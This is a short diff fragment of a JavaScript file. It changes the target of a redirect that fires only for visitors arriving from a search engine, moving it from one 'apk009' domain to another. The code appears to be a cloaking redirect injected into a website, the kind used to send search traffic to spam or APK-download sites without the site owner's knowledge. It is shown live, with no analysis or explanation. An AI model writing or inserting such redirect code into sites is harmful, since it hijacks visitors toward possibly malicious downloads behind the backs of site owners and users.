@@ -10,6 +10,6 @@
   });
 
   if (isFromSearchEngine) {
-    window.location.href = 'https://apk009.asha776.com';
+    window.location.href = 'https://apk009.tkvip781.com/';
   }
 })();
